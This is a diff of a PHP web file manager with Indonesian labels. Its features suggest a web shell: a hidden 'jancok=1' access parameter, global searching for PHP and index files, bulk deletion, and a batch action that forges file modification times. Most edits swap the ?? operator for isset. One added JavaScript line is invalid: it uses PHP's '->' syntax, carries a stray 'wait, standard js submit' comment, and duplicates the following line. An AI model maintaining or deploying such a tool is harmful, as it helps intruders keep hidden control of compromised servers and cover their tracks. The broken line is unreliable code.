@@ -78,7 +78,6 @@ if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
     $new_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
     
     if (file_exists($old_p)) {
-        // Jika file tujuan sudah ada, timpa (hapus dulu file tujuannya)
         if (file_exists($new_p)) {
             if (is_file($new_p)) {
                 @unlink($new_p);
@@ -168,7 +167,7 @@ if (isset($_POST['selected_items']) && isset($_POST['batch_action'])) {
         $msg = "Berhasil menghapus $count item terpilih."; $msg_type = 'success';
     } 
     elseif ($action === 'touch') {
-        $input_date = $_POST['batch_date'] ?? date('Y-m-d H:i:s');
+        $input_date = isset($_POST['batch_date']) ? $_POST['batch_date'] : date('Y-m-d H:i:s');
         $new_time = strtotime($input_date);
         if ($new_time !== false) {
             foreach ($items as $item) {
@@ -252,7 +251,6 @@ sort($files);
         .alert-success { background: rgba(74, 222, 128, 0.15); color: var(--accent-green); border: 1px solid rgba(74, 222, 128, 0.3); }
         .alert-error { background: rgba(248, 113, 113, 0.15); color: var(--accent-red); border: 1px solid rgba(248, 113, 113, 0.3); }
         textarea { width: 100%; height: 450px; font-family: 'Fira Code', Consolas, monospace; background: #0f172a; color: #f8fafc; padding: 15px; border: 1px solid var(--border-color); border-radius: 6px; }
-        .neon-title { margin: 0; font-size: 22px; font-weight: 800; background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .action-select { padding: 5px 8px; background: #0f172a; color: #38bdf8; border: 1px solid var(--border-color); border-radius: 4px; font-size: 12px; cursor: pointer; }
 
         .neon-title {
@@ -380,7 +378,7 @@ sort($files);
         <form method="GET" action="" style="display: flex; gap: 8px; width: 100%; margin: 0;">
             <input type="hidden" name="jancok" value="1">
             <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
-            <input type="text" name="search" placeholder="Cari global (.php, index, dll)..." value="<?= htmlspecialchars($_GET['search'] ?? '') ?>" style="flex-grow: 1;">
+            <input type="text" name="search" placeholder="Cari global (.php, index, dll)..." value="<?= htmlspecialchars(isset($_GET['search']) ? $_GET['search'] : '') ?>" style="flex-grow: 1;">
             <button type="submit" class="btn btn-blue">Cari</button>
             <?php if (!empty($_GET['search'])): ?>
                 <a href="?jancok=1&dir=<?= urlencode($dir) ?>" class="btn btn-gray">Reset</a>
@@ -572,6 +570,7 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
         if (newName && newName !== fileName) {
             document.getElementById('old_name').value = fileName;
             document.getElementById('new_name').value = newName;
+            document.getElementById('rename-form')->submit(); // wait, standard js submit:
             document.getElementById('rename-form').submit();
         }
     } else if (action === 'delete') {
